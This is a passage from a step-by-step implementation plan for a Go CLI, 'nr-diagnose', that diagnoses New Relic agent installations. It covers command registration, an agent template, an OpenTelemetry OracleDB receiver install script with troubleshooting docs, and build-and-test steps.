				fmt.Printf("  Skipping %s (agent not in repo)\n", agentName)
				continue
			}

			// Copy .md files from local to repo
			files, _ := os.ReadDir(localDir)
			for _, f := range files {
				if f.IsDir() || !strings.HasSuffix(f.Name(), ".md") {
					continue
				}
				src := filepath.Join(localDir, f.Name())
				dst := filepath.Join(repoDir, f.Name())
				if _, err := os.Stat(dst); err == nil {
					continue // already exists
				}
				if err := copyFile(src, dst); err == nil {
					totalCopied++
				}
			}

			// Copy index.yaml (merge would be better but this is prototype)
			localIndex := filepath.Join(localDir, "index.yaml")
			if _, err := os.Stat(localIndex); err == nil {
				copyFile(localIndex, filepath.Join(repoDir, "index.yaml"))
			}
		}

		if totalCopied == 0 {
			fmt.Println("No new entries to sync.")
			return nil
		}

		fmt.Printf("Copied %d runbook entries to repo.\n", totalCopied)

		// Git add + commit
		gitAdd := exec.Command("git", "add", agentsDir)
		if err := gitAdd.Run(); err != nil {
			fmt.Println("Note: git add failed — stage and commit manually.")
			return nil
		}

		msg := fmt.Sprintf("runbook: sync %d local entries", totalCopied)
		gitCommit := exec.Command("git", "commit", "-m", msg)
		if err := gitCommit.Run(); err != nil {
			fmt.Println("Note: git commit failed — commit manually.")
			return nil
		}

		fmt.Printf("Committed. Run 'git push' to share with team.\n")
		return nil
	},
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}
```

- [ ] **Step 5: Register all commands in main.go**

Update `main.go` to import and register the commands:

```go
// main.go
package main

import (
	"fmt"
	"os"

	"github.com/newrelic/nr-diagnose/cmd"
	"github.com/spf13/cobra"
)

var rootCmd = &cobra.Command{
	Use:   "nr-diagnose",
	Short: "Intelligent CLI diagnostics for New Relic agent installations",
	Long:  "An AI-powered script runner that diagnoses installation failures and suggests fixes.",
}

func init() {
	rootCmd.AddCommand(cmd.RunCmd)
	rootCmd.AddCommand(cmd.ListCmd)
	rootCmd.AddCommand(cmd.NewAgentCmd)
	rootCmd.AddCommand(cmd.SyncCmd)
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
```

Note: The commands need to be exported. Update each command file to export the variable:
- `cmd/run.go`: rename `runCmd` → `RunCmd`
- `cmd/list.go`: rename `listCmd` → `ListCmd`
- `cmd/new_agent.go`: rename `newAgentCmd` → `NewAgentCmd`
- `cmd/sync.go`: rename `syncCmd` → `SyncCmd`

- [ ] **Step 6: Verify it compiles**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go build -o nr-diagnose .
./nr-diagnose --help
./nr-diagnose list
```

Expected: Help shows all subcommands (run, list, new-agent, sync).

- [ ] **Step 7: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add cmd/ main.go
git commit -m "feat: add CLI commands (run, list, new-agent, sync)"
```

---

### Task 14: Agent Template + OTel OracleDB Agent

**Files:**
- Create: `ai-driven-installation/agents/_template/` (all files)
- Create: `ai-driven-installation/agents/otel-oracledb/` (all files)

- [ ] **Step 1: Create the _template agent**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
mkdir -p agents/_template/{knowledge,diagnostics,runbook}
```

Write `agents/_template/manifest.yaml`:
```yaml
name: AGENT_NAME
display_name: "AGENT_DISPLAY_NAME"
description: "TODO: Add description"
target_os: linux
ports: []
services: []
prerequisites: []
```

Write `agents/_template/install.sh`:
```bash
#!/bin/bash
# TODO: Add installation steps for this agent
echo "Installation not configured"
exit 1
```

Write `agents/_template/knowledge/prerequisites.md`:
```markdown
# Prerequisites

TODO: What must be true before this agent can be installed?
```

Write `agents/_template/knowledge/common-failures.md`:
```markdown
# Common Failures

TODO: Document known failure modes and their root causes.
```

Write `agents/_template/knowledge/references.md`:
```markdown
# References

TODO: Add links to official documentation and troubleshooting guides.
```

Write `agents/_template/diagnostics/hints.yaml`:
```yaml
priority_commands: []
context_hints: []
```

Write `agents/_template/runbook/index.yaml`:
```yaml
entries: []
```

- [ ] **Step 2: Create the otel-oracledb agent**

```bash
mkdir -p agents/otel-oracledb/{knowledge,diagnostics,runbook}
```

Write `agents/otel-oracledb/manifest.yaml`:
```yaml
name: otel-oracledb
display_name: "OpenTelemetry OracleDB Receiver"
description: "Installs OTel Collector with the OracleDB receiver for database monitoring"
target_os: linux
ports: [1521]
services: [otelcol-contrib]
prerequisites:
  - "Oracle Instant Client installed (or full Oracle Client)"
  - "TNS_ADMIN environment variable set"
  - "Oracle DB user with SELECT_CATALOG_ROLE or equivalent grants"
  - "Network connectivity to Oracle DB on port 1521"
```

Write `agents/otel-oracledb/install.sh`:
```bash
#!/bin/bash
# OTel Collector + OracleDB Receiver Installation

# Step 1: Download OTel Collector Contrib
curl -sL https://github.com/open-telemetry/opentelemetry-collector-releases/releases/download/v0.96.0/otelcol-contrib_0.96.0_linux_amd64.deb -o /tmp/otelcol-contrib.deb

# Step 2: Install OTel Collector
sudo dpkg -i /tmp/otelcol-contrib.deb

# Step 3: Verify Oracle Instant Client
ls $ORACLE_HOME/lib/libclntsh.so

# Step 4: Verify TNS configuration
tnsping ORCL

# Step 5: Test Oracle connectivity
echo "SELECT 1 FROM DUAL;" | sqlplus -s otel_monitor/password@ORCL

# Step 6: Write OTel config
sudo tee /etc/otelcol-contrib/config.yaml <<'EOF'
receivers:
  oracledb:
    datasource: "oracle://otel_monitor:password@localhost:1521/ORCL"
    collection_interval: 60s
exporters:
  otlp:
    endpoint: "https://otlp.nr-data.net:4317"
    headers:
      api-key: "${NEW_RELIC_LICENSE_KEY}"
service:
  pipelines:
    metrics:
      receivers: [oracledb]
      exporters: [otlp]
EOF

# Step 7: Start OTel Collector
sudo systemctl enable otelcol-contrib
sudo systemctl start otelcol-contrib

# Step 8: Verify collector is running
systemctl is-active otelcol-contrib
```

Write `agents/otel-oracledb/knowledge/prerequisites.md`:
```markdown
# Prerequisites for OTel OracleDB Receiver

## Oracle Instant Client
- Must be installed at $ORACLE_HOME
- libclntsh.so must be accessible
- LD_LIBRARY_PATH must include $ORACLE_HOME/lib

## TNS Configuration
- TNS_ADMIN must point to directory containing tnsnames.ora
- tnsnames.ora must have entry for the target database
- listener.ora must be configured on the DB server

## Database User
- Requires a monitoring user with grants:
  ```sql
  CREATE USER otel_monitor IDENTIFIED BY <password>;
  GRANT CONNECT TO otel_monitor;
  GRANT SELECT_CATALOG_ROLE TO otel_monitor;
  ```

## Network
- Port 1521 (or custom listener port) must be accessible from this host
- Firewall must allow outbound to otlp.nr-data.net:4317
```

Write `agents/otel-oracledb/knowledge/common-failures.md`:
```markdown
# Common Failures - OTel OracleDB Receiver

## ORA-12541: TNS:no listener
- Oracle listener not running on target host
- Fix: `sudo lsnrctl start` on DB server, or check listener.ora

## ORA-12514: TNS:listener does not know of service
- SERVICE_NAME in tnsnames.ora doesn't match DB service
- Fix: Verify with `lsnrctl services` and update tnsnames.ora

## ORA-01017: invalid username/password
- Monitoring user credentials incorrect
- Fix: Reset password with `ALTER USER otel_monitor IDENTIFIED BY <new_pass>`

## libclntsh.so: cannot open shared object file
- Oracle Instant Client not in LD_LIBRARY_PATH
- Fix: `export LD_LIBRARY_PATH=$ORACLE_HOME/lib:$LD_LIBRARY_PATH`

## Connection timed out to otlp.nr-data.net:4317
- Firewall blocking outbound gRPC to New Relic
- Fix: `sudo ufw allow out 4317/tcp` or whitelist in security group

## otelcol-contrib.service: Failed with result 'exit-code'
- Config file syntax error or missing env vars
- Fix: Run `otelcol-contrib validate --config /etc/otelcol-contrib/config.yaml`
```

Write `agents/otel-oracledb/knowledge/references.md`:
```markdown
# References

- [OTel OracleDB Receiver Docs](https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/oracledbreceiver)
- [Oracle Instant Client Downloads](https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html)
- [New Relic OTLP Endpoint](https://docs.newrelic.com/docs/opentelemetry/best-practices/opentelemetry-otlp/)
- [TNS Configuration Guide](https://docs.oracle.com/en/database/oracle/oracle-database/19/netag/configuring-naming-methods.html)
```

Write `agents/otel-oracledb/diagnostics/hints.yaml`:
```yaml
priority_commands:
  - "tnsping ORCL"
  - "nc -zv localhost 1521"
  - "echo $TNS_ADMIN"
  - "echo $ORACLE_HOME"
  - "echo $LD_LIBRARY_PATH"
  - "ls $ORACLE_HOME/lib/libclntsh.so 2>&1"
  - "systemctl status otelcol-contrib"
  - "cat /etc/otelcol-contrib/config.yaml"
  - "nc -zv otlp.nr-data.net 4317"

context_hints:
  - "OracleDB receiver requires Oracle Instant Client libs in LD_LIBRARY_PATH"
  - "TNS resolution failures are the #1 cause of connection issues"
  - "Check listener.ora and tnsnames.ora for mismatched SERVICE_NAME"
  - "The OTel collector runs as the 'otelcol' user - ensure it has access to Oracle libs"
  - "NEW_RELIC_LICENSE_KEY env var must be set for the exporter"
```

Write `agents/otel-oracledb/runbook/index.yaml`:
```yaml
entries: []
```

- [ ] **Step 3: Verify the agent loads**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go build -o nr-diagnose .
./nr-diagnose list
./nr-diagnose run --agent otel-oracledb --dry-run
```

Expected: List shows "otel-oracledb", dry-run shows 8 parsed steps.

- [ ] **Step 4: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add agents/
git commit -m "feat: add agent template and otel-oracledb agent definition"
```

---

### Task 15: Integration Test + Final Build Verification

**Files:**
- Create: `ai-driven-installation/internal/parser/parser_test.go` (already done)
- Verify: all packages compile and tests pass

- [ ] **Step 1: Run all tests**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./... -v
```

Expected: All tests in parser, registry, diagnostics, scrub, runbook pass.

- [ ] **Step 2: Build final binary**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go build -o nr-diagnose .
```

- [ ] **Step 3: Test CLI commands**

```bash
./nr-diagnose --help
./nr-diagnose list
./nr-diagnose run --agent otel-oracledb --dry-run
./nr-diagnose new-agent test-agent
ls agents/test-agent/
rm -rf agents/test-agent
```

Expected: All commands work. Dry-run shows parsed steps. New agent creates correct structure.

- [ ] **Step 4: Commit final state**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add -A
git commit -m "feat: complete nr-diagnose CLI with all components"
```

---
